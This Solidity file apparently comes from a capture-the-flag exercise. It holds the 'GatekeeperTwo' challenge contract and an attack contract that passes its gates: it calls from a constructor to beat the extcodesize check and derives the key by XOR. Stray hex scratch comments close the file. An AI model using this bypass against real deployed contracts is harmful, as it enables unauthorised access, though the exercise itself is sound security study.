// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^
                uint64(_gateKey) ==
                type(uint64).max
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);

    function entrant() external view returns (address);
}

contract GatekeeperTwoHack {
    GatekeeperTwo gatekeeperTwo;

    constructor(address _addr) {
        gatekeeperTwo = GatekeeperTwo(_addr);
        uint64 value_of_gateKey = uint64(
            bytes8(keccak256(abi.encodePacked(address(this))))
        ) ^ type(uint64).max;
        bytes8 gateKey = bytes8(value_of_gateKey);
        gatekeeperTwo.enter(gateKey);
        // (a ^ b == c)
        // (a ^ c == b)
    }
}
//0x6100000000000000000000000000000000000000000000000000000000000000
//0x0000000000000000000000000000000000000000000000000000000000000001
//0x0000000000000000000000000000000000000000000000000000000000000020

//1234567890
//31323334353637383930
//0x61 6162 01 0a

//3beb26c4
//000000000000000000000000000000000000000d56462e3ba69bfb659aaaaaaa